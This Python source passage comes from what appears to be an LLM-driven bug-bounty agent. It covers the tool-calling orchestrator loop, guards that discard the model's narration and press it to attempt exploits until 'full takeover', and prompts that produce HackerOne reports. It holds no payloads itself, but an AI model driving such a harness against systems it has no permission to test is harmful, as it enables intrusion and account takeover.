                ai_resp, tokens = ask_neural_core(
                    prompt=user_text if iteration == 0 else "Continue analysis based on tool results. Choose next tool or output 'DONE'.",
                    system_prompt=_get_orchestrator_system_prompt(),
                    role="orchestrator",
                    thinking=False,
                    history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                    return_usage=True,
                    cancel_check=cancel_check,
                    tools=Agent._build_native_tools()
                )
                
                if tokens is not None and emit and hasattr(emit, "set_token_count"):
                    emit.set_token_count(tokens)

                def _orch_failed(resp):
                    return (not resp) or (isinstance(resp, str) and resp.startswith("Error:"))

                if _orch_failed(ai_resp):
                    # Provider-level error or empty completion. Already retried
                    # once at the source in ai_utils.call_nvidia/call_ollama —
                    # if it's still failing, give it one more visible attempt
                    # here before giving up on this iteration, since a 500
                    # streak can outlast a single 1.5s backoff.
                    if emit and hasattr(emit, "set_label"):
                        emit.set_label("Wait a minute.. some issue on my end. Let me cook again..")
                    ai_resp, tokens = ask_neural_core(
                        prompt=user_text if iteration == 0 else "Continue analysis based on tool results. Choose next tool or output 'DONE'.",
                        system_prompt=_get_orchestrator_system_prompt(),
                        role="orchestrator",
                        thinking=False,
                        history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                        return_usage=True,
                        cancel_check=cancel_check,
                        tools=Agent._build_native_tools()
                    )
                    if tokens is not None and emit and hasattr(emit, "set_token_count"):
                        emit.set_token_count(tokens)
                    if _orch_failed(ai_resp):
                        # Still failing — do NOT let this raw error string ride
                        # along as `ai_resp` into the final `final_answer or
                        # ai_resp or fallback` chain below; that was leaking
                        # "Error: NVIDIA NIM API returned 500 - ..." straight
                        # to the researcher whenever synthesis also failed.
                        # Clear it so only the friendly fallback can surface.
                        ai_resp = None
                        break

                # Check if ask_neural_core returned a native tool call object (dict)
                tool_call = None
                if isinstance(ai_resp, dict) and "tool" in ai_resp:
                    tool_call = ai_resp
                    # Create a string representation for logging & prev check
                    ai_resp = json.dumps(tool_call)

                if isinstance(ai_resp, str) and not ai_resp.strip():
                    break

                # Guard against the orchestrator re-entering with the exact same
                # output it just produced (identical plan/tool-call regenerated
                # instead of progressing) — treat that as "done planning" and
                # fall through to synthesis rather than burning iterations.
                if isinstance(ai_resp, str) and ai_resp.strip() == (_prev_ai_resp or "").strip():
                    break
                if isinstance(ai_resp, str):
                    _prev_ai_resp = ai_resp

                # Check for JSON tool invocation in text response (if native tool call didn't return a dict)
                if not tool_call and isinstance(ai_resp, str):
                    json_match = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', ai_resp)
                    if json_match:
                        try:
                            parsed = json.loads(json_match.group(1))
                            if isinstance(parsed, dict) and "tool" in parsed:
                                tool_call = parsed
                        except Exception:
                            pass

                # Balanced-brace scan — catches tool-call JSON that's well-formed
                # except for stray trailing content after it (e.g. one extra
                # '}'), which the older greedy regexes below fail on outright.
                if not tool_call and isinstance(ai_resp, str) and '"tool"' in ai_resp:
                    parsed = _extract_first_balanced_json(ai_resp)
                    if isinstance(parsed, dict) and "tool" in parsed:
                        tool_call = parsed

                if not tool_call and isinstance(ai_resp, str):
                    tool_json_match = re.search(r'(\{\s*"tool"\s*:\s*[\s\S]*\})', ai_resp)
                    if tool_json_match:
                        try:
                            parsed = json.loads(tool_json_match.group(1))
                            if isinstance(parsed, dict) and "tool" in parsed:
                                tool_call = parsed
                        except Exception:
                            pass

                if not tool_call:
                    # Catch patterns like: record_finding { ... } or (Suggested next tool: record_finding { ... })
                    for reg_tool in TOOL_REGISTRY.keys():
                        pattern = rf'(?:Suggested next tool:\s*)?\b({reg_tool})\b\s*(\{{[\s\S]*\}})'
                        m = re.search(pattern, ai_resp, re.IGNORECASE)
                        if m:
                            t_name_matched = m.group(1).lower()
                            t_args_str = m.group(2).rstrip(" \t\n\r)")
                            try:
                                parsed_args = json.loads(t_args_str)
                                if isinstance(parsed_args, dict):
                                    tool_call = {"tool": t_name_matched, "args": parsed_args}
                                    break
                            except Exception:
                                pass

                if tool_call and tool_call.get("tool") in TOOL_REGISTRY:
                    t_name = tool_call["tool"]
                    t_args = tool_call.get("args") or tool_call.get("parameters") or tool_call.get("arguments") or {}

                    # Already ran this exact tool+args earlier THIS turn (not just
                    # last iteration) -> the orchestrator is repeating itself, not
                    # progressing. Stop calling and move to synthesis with what's
                    # already gathered, instead of re-crawling and re-saving.
                    _sig = (t_name, json.dumps(t_args, sort_keys=True, default=str))
                    if _sig in _executed_signatures:
                        _dup_skip_count += 1
                        if _dup_skip_count >= 2:
                            # Repeating itself even after being told not to — stop
                            # burning iterations and move straight to synthesis.
                            break
                        self.history.append({
                            "role": "user",
                            "content": f"[TOOL SKIPPED] '{t_name}' with these exact args already ran earlier this turn — reuse those results instead of repeating it."
                        })
                        user_text = f"You already ran '{t_name}' with identical args. Do not repeat it — synthesize from the results you already have, or choose a different tool/target."
                        continue
                    _executed_signatures.add(_sig)

                    # Hard cap: record_finding specifically, enforced before
                    # execution — see _RECORD_FINDING_CAP_PER_TURN comment above.
                    if t_name == "record_finding":
                        _record_finding_calls_this_turn += 1
                        if _record_finding_calls_this_turn > _RECORD_FINDING_CAP_PER_TURN:
                            blocked_result = {
                                "status": "blocked",
                                "note": (
                                    f"Hard cap hit — that's {_record_finding_calls_this_turn} record_finding "
                                    f"calls this turn, capped at {_RECORD_FINDING_CAP_PER_TURN}. Whatever you're "
                                    f"trying to log, it's a variation of something already recorded — stop "
                                    f"logging and move on to the next real step, or finish up."
                                )
                            }
                            if emit and hasattr(emit, "tool_result"):
                                emit.tool_result(t_name, blocked_result)
                            self.history.append({"role": "assistant", "content": ai_resp})
                            self.history.append({
                                "role": "user",
                                "content": f"[TOOL BLOCKED] {blocked_result['note']}"
                            })
                            user_text = "record_finding is capped for this turn. Do not call it again — move on to the next step or wrap up."
                            continue

                    tools_executed.append(t_name)
                    
                    if emit and hasattr(emit, "set_label"):
                        emit.set_label(f"Yep, here we go — running {t_name}")

                    if emit and hasattr(emit, "tool_start"):
                        emit.tool_start(t_name, t_args)
                    elif emit and hasattr(emit, "info"):
                        emit.info(f"[*] Executing tool: {t_name} with args: {t_args}")

                    tool_result = self.execute_tool_call(t_name, t_args, emit)

                    if not (isinstance(tool_result, dict) and tool_result.get("status") in _NO_OP_TOOL_STATUSES):
                        _productive_tools_executed.append(t_name)

                    if emit and hasattr(emit, "tool_result"):
                        emit.tool_result(t_name, tool_result)

                    if emit and hasattr(emit, "set_label"):
                        emit.set_label("Got there — checking results")

                    # Feed result back to conversation
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
                    })
                    user_text = f"Tool '{t_name}' returned:\n{json.dumps(tool_result, indent=2)}\nEvaluate these findings."
                    continue

                elif tool_call:
                    # Hallucinated or unregistered tool name
                    unregistered_name = tool_call.get("tool", "unknown")
                    if emit and hasattr(emit, "set_label"):
                        emit.set_label("Got there — checking results")

                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": f"[TOOL ERROR] '{unregistered_name}' is not a valid tool. Available tools: {', '.join(TOOL_REGISTRY.keys())}"
                    })
                    user_text = f"Tool '{unregistered_name}' is invalid. Please select from available tools: {', '.join(TOOL_REGISTRY.keys())}"
                    continue

                elif isinstance(ai_resp, str) and '"tool"' in ai_resp and _narration_retry_count < 5:
                    # It was clearly attempting a tool call (has a "tool" key)
                    # but every extraction attempt above — including the
                    # balanced-brace scanner — still failed to parse it as
                    # valid JSON. This used to fall straight through to the
                    # narration check (which won't catch it, there's no
                    # narration wording here) and then to `break`, leaking
                    # the raw broken JSON to the researcher as if it were the
                    # final answer, with the intended tool call never run.
                    # Force a clean retry instead of silently giving up.
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": (
                            "SYSTEM: That was not valid JSON — it looked like a tool call "
                            "but failed to parse (check for mismatched braces/quotes, "
                            "especially inside string args like payload content). "
                            "Resend the SAME tool call as a single valid JSON object, "
                            "nothing else before or after it."
                        )
                    })
                    user_text = "Resend the tool call as valid JSON only."
                    continue

                # Non-tool response — could be a genuine "DONE"/conversational
                # reply, OR the model narrating an intended action instead of
                # actually emitting the tool-call JSON (e.g. "Let me check the
                # target now.") — the latter must NOT be allowed to silently
                # end the turn, or the whole session does nothing but talk.
                _narration_markers = (
                    "let me ", "i'll ", "i will ", "let's ", "going to ",
                    "i'm going to", "proceed to", "next, i", "now i",
                    "i'll now", "i will now", "i need to", "i should",
                    "first, i", "starting with", "beginning", "let me execute",
                    "executing now", "initiating", "i'm about to",
                    "i can ", "i want to", "my plan", "here's my",
                    "let me check", "let me run", "let me fetch",
                    "i'm now", "i shall", "allow me", "i'm going",
                    "next:", "next step", "the next step", "will fetch",
                    "will probe", "will analyze", "will inspect", "harvest",
                    "examine", "investigate",
                )
                _next_step_markers = ("next:", "next step", "the next step", "proceed to", "will fetch", "will probe", "will analyze", "will inspect", "harvest", "let me ")
                _resp_lower = ai_resp.lower()
                _has_explicit_completion = bool(re.search(r"^\s*done\b|^\s*\[status:\s*(objective achieved|full takeover|exhausted)\]", _resp_lower, re.MULTILINE))
                _has_next_step = any(m in _resp_lower for m in _next_step_markers)

                _looks_like_narration = (
                    (_has_next_step or any(m in _resp_lower for m in _narration_markers))
                    and not _has_explicit_completion
                )

                # Primary narration guard: enforce continuous tool execution until explicit completion
                if _looks_like_narration and _narration_retry_count < 5:
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    # Build a target-aware example so the model knows what to emit
                    _target_url = self._display_host
                    if not _target_url.startswith(("http://", "https://")):
                        _target_url = f"http://{_target_url}"
                    self.history.append({
                        "role": "user",
                        "content": (
                            f"SYSTEM: Your previous text was DISCARDED — it performed no action and produced no results. "
                            f"The target is '{self._display_host}'. The mission is: '{original_user_text}'. "
                            f"Emit ONLY tool-call JSON. Example: "
                            f'{{"tool": "curl", "args": {{"url": "{_target_url}", "method": "GET"}}}}. '
                            f"No English text. No explanation. No preamble. Just the raw JSON object."
                        )
                    })
                    user_text = "Execute the tool now — respond with ONLY the JSON, no narration."
                    continue

                # Secondary narration guard: tools already executed but model narrates next step
                if _looks_like_narration and tools_executed and _narration_retry_count < 5:
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": (
                            "SYSTEM: You described an intended next action instead of executing it. "
                            "Emit the tool-call JSON now or output 'DONE' if no further tools are needed. "
                            "No narration, no explanation — just JSON or DONE."
                        )
                    })
                    user_text = "Emit the tool-call JSON or DONE."
                    continue

                # Safety net: narration retries exhausted, real target exists.
                # Previously this only fired when ZERO tools had executed yet
                # this turn — so a turn that ran a setup tool (e.g.
                # listener(action=start)) and then got stuck narrating its next
                # step ("next I will probe the survey endpoint...") never hit
                # this recovery; it just fell straight to synthesis with the
                # setup done but the actual exploit attempt never made,
                # producing a "here's my plan" answer instead of a result.
                # Now it fires either way — zero tools gets the generic bootstrap
                # probe as before; some-tools-already-run gets a stronger,
                # mission-specific push instead of being handed to synthesis.
                if has_real_target and _narration_retry_count >= 5:
                    if not tools_executed:
                        _target_url = self._display_host
                        if not _target_url.startswith(("http://", "https://")):
                            _target_url = f"http://{_target_url}"
                        tool_call = {"tool": "curl", "args": {"url": _target_url, "method": "GET"}}
                        t_name = tool_call["tool"]
                        t_args = tool_call["args"]
                        tools_executed.append(t_name)
                        _productive_tools_executed.append(t_name)
                        if emit and hasattr(emit, "set_label"):
                            emit.set_label(f"Let me cook — probing {self._display_host}")
                        if emit and hasattr(emit, "tool_start"):
                            emit.tool_start(t_name, t_args)
                        elif emit and hasattr(emit, "info"):
                            emit.info(f"[*] Auto-probe: {t_name} {t_args}")
                        tool_result = self.execute_tool_call(t_name, t_args, emit)
                        if emit and hasattr(emit, "tool_result"):
                            emit.tool_result(t_name, tool_result)
                        self.history.append({"role": "assistant", "content": '{"tool": "curl", "args": ' + json.dumps(t_args) + '}'})
                        self.history.append({
                            "role": "user",
                            "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
                        })
                        user_text = f"Tool '{t_name}' returned results. Analyze these findings and choose the next tool or output 'DONE'."
                        _narration_retry_count = 0  # Reset for the next phase
                        continue
                    elif _narration_retry_count < 8:
                        # Some tool(s) already ran but it's still describing the
                        # next step instead of doing it. Push harder, quoting
                        # exactly what's already been run and what was asked for,
                        # rather than silently handing an "infra set up, exploit
                        # never attempted" turn to synthesis.
                        _narration_retry_count += 1
                        self.history.append({"role": "assistant", "content": ai_resp})
                        self.history.append({
                            "role": "user",
                            "content": (
                                f"SYSTEM: You keep describing the next step instead of doing it. "
                                f"You already ran: {', '.join(tools_executed)}. "
                                f"The mission is still: '{original_user_text}'. "
                                f"Emit ONLY the next tool-call JSON that actually attempts it — "
                                f"no narration, no plan, no explanation."
                            )
                        })
                        user_text = "Execute the tool now — respond with ONLY the JSON."
                        continue
                    # Even the extra pushes didn't produce a real tool call —
                    # genuinely stuck. Fall through to synthesis with whatever
                    # was gathered, same as the original behavior.

                break


        # ── 4. Final Answer Generation (Streaming, Fast & Context-Specific) ───────
        if emit and hasattr(emit, "set_label"):
            emit.set_label("Got there — wrapping up")

        cfg = load_config()
        self.last_tool_count = len(tools_executed)

        # Branch point: only turns that actually ran a hunting tool (or are
        # generating a report off prior confirmed findings) get the heavy
        # target/scope/doctrine prompt. Everything else — plain conversation,
        # Q&A, "no real target" turns — gets the lightweight persona prompt.
        # This is the fix for both the TARGET:-default leak and the model
        # quoting its own baseline doctrine back in casual replies.
        synthesizer_system_prompt = (
            full_synth_prompt
            if (_productive_tools_executed or (report_requested and has_critical_findings))
            else casual_synth_prompt
        )

        def _is_provider_failure(answer):
            return (not answer) or (isinstance(answer, str) and answer.startswith("Error:"))

        def _ask_synthesizer(prompt, hist):
            """Synthesizer call with one silent retry on an empty completion
            or a provider-level error string (e.g. transient 5xx) — these are
            not worth surfacing to the researcher as-is."""
            answer, tok = ask_neural_core(
                prompt=prompt,
                system_prompt=synthesizer_system_prompt,
                role="synthesizer",
                thinking=False,
                history=hist,
                on_token=on_token,
                return_usage=True,
                cancel_check=cancel_check
            )
            if _is_provider_failure(answer):
                logger.debug(f"Synthesizer call failed ({answer!r}), retrying once.")
                if emit and hasattr(emit, "set_label"):
                    emit.set_label("Wait a minute.. some issue on my end. Let me cook again..")
                time.sleep(1.5)
                answer2, tok2 = ask_neural_core(
                    prompt=prompt,
                    system_prompt=synthesizer_system_prompt,
                    role="synthesizer",
                    thinking=False,
                    history=hist,
                    on_token=on_token,
                    return_usage=True,
                    cancel_check=cancel_check
                )
                if not _is_provider_failure(answer2):
                    answer, tok = answer2, (tok2 if tok2 is not None else tok)
                else:
                    # Both attempts failed — don't leak the raw provider error
                    # string into the transcript as if it were a real answer.
                    answer, tok = None, tok
            return answer, tok

        # ── Interrupted-turn short-circuit ──────────────────────────────
        # Ctrl+C sets cancel_check(); the orchestrator loop above stops
        # calling new tools once it notices, but before this fix the code
        # fell straight into the normal "turn completed" synthesis prompts
        # below — which assume a natural DONE and can lead the synthesizer
        # to echo a stray tool-call-shaped JSON object back as prose (seen
        # as "(Suggested next tool: ...)" in the transcript). Give it an
        # explicit interrupted framing instead so it reports what was
        # actually gathered before the cancel, and says plainly that the
        # turn was interrupted rather than pretending it finished.
        _was_cancelled = bool(cancel_check and cancel_check())

        if _was_cancelled:
            if tools_executed:
                synth_prompt = (
                    f"The researcher interrupted this analysis (Ctrl+C) before it "
                    f"reached a conclusion.\n\n"
                    f"Tools executed before the interrupt: {', '.join(tools_executed)}.\n\n"
                    f"Summarize plainly what was gathered from those tool results so "
                    f"far — what was tried, what was observed, anything found. State "
                    f"clearly at the start that this analysis was interrupted and is "
                    f"not a finished or conclusive result. Do NOT invent a status, a "
                    f"suggested next tool call, or claim anything was achieved beyond "
                    f"what the tool results above actually show."
                )
            else:
                synth_prompt = (
                    "The researcher interrupted this turn (Ctrl+C) before any tool "
                    "ran or a result was produced. Briefly acknowledge the "
                    "interruption and ask what they'd like to do next — do not "
                    "invent findings or a summary, since nothing was actually run."
                )

            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )
        elif not _productive_tools_executed:
            if report_requested and has_critical_findings:
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Target: '{self._display_host}'.\n"
                    f"Generate the complete, professional HackerOne vulnerability report based on the confirmed findings and evidence gathered for this target."
                )
            else:
                synth_prompt = original_user_text

            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )
        else:
            if report_requested and has_critical_findings:
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"Generate a complete, professional HackerOne vulnerability report based strictly on the verified findings and actual evidence gathered."
                )
            else:
                synth_prompt = (
                    f"The researcher asked/instructed: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"Synthesize the investigation results factually, clearly, and concisely based strictly on real tool outputs.\n"
                    f"- Check: What was the primary requested target account/role? Did tool outputs prove compromise of THAT exact account, or only an intermediate stepping-stone account?\n"
                    f"- Explain what was tested and what was observed in the tool outputs (status codes, returned HTML/JSON, cookies, credentials/comments).\n"
                    f"- If a user directory or member table was returned, note that this is a directory listing, not an account takeover of the members in that table.\n"
                    f"- If only an intermediate session or low-privilege foothold was obtained, say plainly that it's partial/in-progress (no bracket tags) and explain the exact next step to achieve full takeover of the primary target.\n"
                    f"- If a login attempt failed (e.g. returned 'Invalid username or password' or login form despite HTTP 200), state that it failed and do NOT claim account takeover.\n"
                    f"- Outline the next logical testing steps.\n"
                    f"- Do NOT generate a rigid, multi-section formal vulnerability report unless the user explicitly requested a report."
                )

            if len(tools_executed) > 0 and cfg.get("show_recaps", True):
                synth_prompt += "\n\nIMPORTANT: Write your complete, detailed analysis, PoC commands, and findings with full markdown formatting first. ONLY on the very last line of your response, add a single summary line in this exact format:\nrecap: Goal was [goal]. Done: [what was accomplished]. Next: [recommended next step]."
            
            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )

        if tokens is not None and emit and hasattr(emit, "set_token_count"):
            emit.set_token_count(tokens)

        final_response = final_answer or ai_resp or "Hit a blank response twice in a row on my end — try that again?"
        final_response = _clean_synthesizer_output(final_response)
        self.history.append({"role": "assistant", "content": final_response})
        self._compact_history_if_needed()
        self.target.state["history"] = self.history
        self.target.state["session_digest"] = self.session_digest
        save_target(self.target)
        return final_response


# Global singleton agent instance for active session
_global_agent: Optional[Agent] = None

def get_agent(target_name: Optional[str] = None) -> Agent:
    global _global_agent
    if _global_agent is None:
        name = target_name or "default"
        _global_agent = Agent(create_or_load_target(name))
    else:
        if target_name and target_name != "default" and target_name != _global_agent.target.name:
            _global_agent.set_target(target_name)
    return _global_agent

def handle_message(user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, on_token: Optional[Callable[[str], None]] = None, forced_skill: Optional[str] = None, cancel_check: Optional[Callable[[], bool]] = None) -> str:
    """Entrypoint for conversational chat queries."""
    target_name = (session_context or {}).get("target")
    agent = get_agent(target_name)
    if forced_skill:
        agent._forced_skill = forced_skill
    return agent.handle_message(user_text, session_context=session_context, emit=emit, on_token=on_token, cancel_check=cancel_check)